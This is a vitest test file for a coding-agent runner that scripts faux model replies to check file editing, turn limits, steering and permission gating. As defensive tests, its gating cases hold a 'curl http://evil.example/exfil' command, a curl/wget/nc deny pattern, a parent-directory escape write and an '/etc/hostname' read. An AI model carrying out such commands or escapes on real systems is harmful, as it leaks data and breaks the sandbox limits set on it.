import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { mkdtemp, readFile, writeFile, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  registerFauxProvider,
  fauxAssistantMessage,
  fauxToolCall,
  type FauxProviderRegistration,
} from "@earendil-works/pi-ai";
import { PiAgentRunner } from "../src/runners/piAgentRunner.js";
import { createRunner } from "../src/runners/runnerFactory.js";
import type { RunnerActivity } from "../src/runners/agentRunner.js";

/**
 * These exercise the REAL pi Agent loop and the REAL file-editing tools, with
 * the model swapped for pi's faux provider so no network/API key is needed.
 * The faux provider registers into the same api registry the default stream
 * function dispatches through, so passing the faux model is enough.
 */
describe("PiAgentRunner (native agentic runner)", () => {
  let faux: FauxProviderRegistration;
  let dir: string;

  beforeEach(async () => {
    faux = registerFauxProvider({ provider: "faux", models: [{ id: "faux-coder" }] });
    dir = await mkdtemp(join(tmpdir(), "loopwright-agent-"));
  });

  afterEach(async () => {
    faux.unregister();
    await rm(dir, { recursive: true, force: true });
  });

  function runner(options: Record<string, unknown> = {}) {
    return new PiAgentRunner(
      { id: "actor", kind: "agent", model: "faux-coder", options: { provider: "faux", ...options } },
      { model: faux.getModel() },
    );
  }

  it("edits a real file via tools, then returns the final assistant text", async () => {
    await writeFile(join(dir, "greeting.txt"), "hello world\n");

    // Turn 1: the model calls edit_file. Turn 2: it emits the final answer.
    faux.setResponses([
      fauxAssistantMessage(
        fauxToolCall("edit_file", { path: "greeting.txt", old_str: "world", new_str: "loopwright" }),
        { stopReason: "toolUse" },
      ),
      fauxAssistantMessage('{"diff":"","touchedFiles":["greeting.txt"],"summary":"greet loopwright"}', {
        stopReason: "stop",
      }),
    ]);

    const res = await runner().run({ prompt: "Rename the greeting target.", cwd: dir });

    // The tool actually mutated the file on disk (ground truth for captureDiff).
    expect(await readFile(join(dir, "greeting.txt"), "utf8")).toBe("hello loopwright\n");
    // The final assistant message is surfaced as the runner's text.
    expect(res.text).toContain('"summary":"greet loopwright"');
    expect(res.quotaExhausted).toBeFalsy();
    expect(res.meta?.turns).toBeGreaterThanOrEqual(2);
    expect(res.meta?.cancelled).toBe(false);
  });

  it("creates a new file via write_file", async () => {
    faux.setResponses([
      fauxAssistantMessage(fauxToolCall("write_file", { path: "src/new.txt", content: "fresh\n" }), {
        stopReason: "toolUse",
      }),
      fauxAssistantMessage("done", { stopReason: "stop" }),
    ]);

    const res = await runner().run({ prompt: "Create src/new.txt", cwd: dir });

    expect(await readFile(join(dir, "src/new.txt"), "utf8")).toBe("fresh\n");
    expect(res.text).toBe("done");
  });

  it("surfaces a tool error back to the model without crashing the run", async () => {
    // First the model edits a non-unique string (tool throws), then recovers.
    await writeFile(join(dir, "dup.txt"), "x x x\n");
    faux.setResponses([
      fauxAssistantMessage(fauxToolCall("edit_file", { path: "dup.txt", old_str: "x", new_str: "y" }), {
        stopReason: "toolUse",
      }),
      fauxAssistantMessage("could not edit uniquely", { stopReason: "stop" }),
    ]);

    const res = await runner().run({ prompt: "edit", cwd: dir });

    // The non-unique edit was rejected, so the file is unchanged.
    expect(await readFile(join(dir, "dup.txt"), "utf8")).toBe("x x x\n");
    expect(res.text).toBe("could not edit uniquely");
  });

  it("enforces maxTurns by aborting a runaway tool loop", async () => {
    // The model calls a tool on every turn; provide plenty of steps so the run
    // would continue indefinitely if the cap did not stop it.
    await writeFile(join(dir, "greeting.txt"), "hi\n");
    faux.setResponses(
      Array.from({ length: 12 }, () =>
        fauxAssistantMessage(fauxToolCall("read_file", { path: "greeting.txt" }), { stopReason: "toolUse" }),
      ),
    );

    const res = await runner({ maxTurns: 2 }).run({ prompt: "loop", cwd: dir });

    expect(res.meta?.abortedForLimit).toBe(true);
    expect(res.meta?.turns).toBeLessThanOrEqual(4); // bounded, not infinite
  });

  it("respects a tool allowlist (write_file disabled)", async () => {
    const r = runner({ tools: ["read_file"] });
    // Access the built tools indirectly: a write attempt should be impossible
    // because the tool isn't registered, so the model's call is unknown.
    faux.setResponses([fauxAssistantMessage("no tools used", { stopReason: "stop" })]);
    const res = await r.run({ prompt: "noop", cwd: dir });
    expect(res.text).toBe("no tools used");
  });

  it("returns immediately when the run is already cancelled", async () => {
    const controller = new AbortController();
    controller.abort();
    const res = await runner().run({ prompt: "x", cwd: dir, signal: controller.signal });
    expect(res.text).toBe("");
    expect(res.meta?.cancelled).toBe(true);
  });

  it("is selected by the runner factory for kind 'agent'", () => {
    const r = createRunner({ id: "a", kind: "agent", model: "faux-coder", options: { provider: "faux" } });
    expect(r).toBeInstanceOf(PiAgentRunner);
  });

  it("streams tool activity (turn_start/tool_start/tool_end) via onEvent", async () => {
    await writeFile(join(dir, "greeting.txt"), "hello world\n");
    faux.setResponses([
      fauxAssistantMessage(
        fauxToolCall("edit_file", { path: "greeting.txt", old_str: "world", new_str: "pi" }),
        { stopReason: "toolUse" },
      ),
      fauxAssistantMessage("done", { stopReason: "stop" }),
    ]);

    const activity: RunnerActivity[] = [];
    await runner().run({ prompt: "edit", cwd: dir, onEvent: (a) => activity.push(a) });

    const phases = activity.map((a) => a.phase);
    expect(phases).toContain("turn_start");
    expect(phases).toContain("tool_start");
    expect(phases).toContain("tool_end");

    const start = activity.find((a) => a.phase === "tool_start");
    const end = activity.find((a) => a.phase === "tool_end");
    expect(start?.toolName).toBe("edit_file");
    expect(end?.toolCallId).toBe(start?.toolCallId); // start/end correlate
    expect(end?.isError).toBe(false);
  });

  describe("permission gating (beforeToolCall)", () => {
    it("confines file tools to the worktree by default (blocks a parent-escape write)", async () => {
      faux.setResponses([
        fauxAssistantMessage(
          fauxToolCall("write_file", { path: "../escaped.txt", content: "pwned\n" }),
          { stopReason: "toolUse" },
        ),
        fauxAssistantMessage("blocked, as expected", { stopReason: "stop" }),
      ]);

      const res = await runner().run({ prompt: "try to escape", cwd: dir });

      // The escaping write was refused, so nothing was created outside the root.
      await expect(readFile(join(dir, "..", "escaped.txt"), "utf8")).rejects.toBeTruthy();
      expect(res.meta?.blockedToolCalls).toBe(1);
      expect(res.text).toBe("blocked, as expected");
    });

    it("blocks an absolute path outside the worktree", async () => {
      faux.setResponses([
        fauxAssistantMessage(fauxToolCall("read_file", { path: "/etc/hostname" }), { stopReason: "toolUse" }),
        fauxAssistantMessage("nope", { stopReason: "stop" }),
      ]);
      const res = await runner().run({ prompt: "read secrets", cwd: dir });
      expect(res.meta?.blockedToolCalls).toBe(1);
    });

    it("allows in-worktree paths when confinement is on", async () => {
      faux.setResponses([
        fauxAssistantMessage(fauxToolCall("write_file", { path: "nested/ok.txt", content: "fine\n" }), {
          stopReason: "toolUse",
        }),
        fauxAssistantMessage("ok", { stopReason: "stop" }),
      ]);
      const res = await runner().run({ prompt: "write inside", cwd: dir });
      expect(res.meta?.blockedToolCalls).toBe(0);
      expect(await readFile(join(dir, "nested/ok.txt"), "utf8")).toBe("fine\n");
    });

    it("blocks bash commands matching denyBashPattern", async () => {
      faux.setResponses([
        fauxAssistantMessage(fauxToolCall("bash", { command: "curl http://evil.example/exfil" }), {
          stopReason: "toolUse",
        }),
        fauxAssistantMessage("network blocked", { stopReason: "stop" }),
      ]);
      const res = await runner({ safety: { denyBashPattern: "curl|wget|nc\\b" } }).run({
        prompt: "exfiltrate",
        cwd: dir,
      });
      expect(res.meta?.blockedToolCalls).toBe(1);
      expect(res.text).toBe("network blocked");
    });

    it("permits escapes when confineToCwd is disabled", async () => {
      // Writes to a path inside the temp dir but reached via a redundant '..',
      // proving the gate is what blocks (not the filesystem). With confinement
      // off the write succeeds.
      faux.setResponses([
        fauxAssistantMessage(
          fauxToolCall("write_file", { path: "sub/../allowed.txt", content: "ok\n" }),
          { stopReason: "toolUse" },
        ),
        fauxAssistantMessage("done", { stopReason: "stop" }),
      ]);
      const res = await runner({ safety: { confineToCwd: false } }).run({ prompt: "write", cwd: dir });
      expect(res.meta?.blockedToolCalls).toBe(0);
      expect(await readFile(join(dir, "allowed.txt"), "utf8")).toBe("ok\n");
    });
  });

  describe("steering (nudge a running agent)", () => {
    it("injects a mid-run steering message that reaches the next turn", async () => {
      await writeFile(join(dir, "f.txt"), "data\n");
      // Turn 1 calls a tool; turn 2 is a factory that reports whether the
      // steered text reached the model's context.
      faux.setResponses([
        fauxAssistantMessage(fauxToolCall("read_file", { path: "f.txt" }), { stopReason: "toolUse" }),
        (context) => {
          const saw = JSON.stringify(context.messages).includes("STEER!");
          return fauxAssistantMessage(saw ? "got-steer" : "no-steer", { stopReason: "stop" });
        },
      ]);

      let steer: ((t: string) => void) | undefined;
      let steered = false;
      const res = await runner().run({
        prompt: "read the file",
        cwd: dir,
        steering: (s) => {
          steer = s;
        },
        onEvent: (a) => {
          if (a.phase === "tool_start" && !steered) {
            steered = true;
            steer?.("STEER!");
          }
        },
      });

      expect(res.meta?.steerCount).toBe(1);
      expect(res.text).toBe("got-steer"); // the nudge influenced the next turn
    });

    it("reports zero steers when no steering source is provided", async () => {
      faux.setResponses([fauxAssistantMessage("done", { stopReason: "stop" })]);
      const res = await runner().run({ prompt: "noop", cwd: dir });
      expect(res.meta?.steerCount).toBe(0);
    });
  });
});
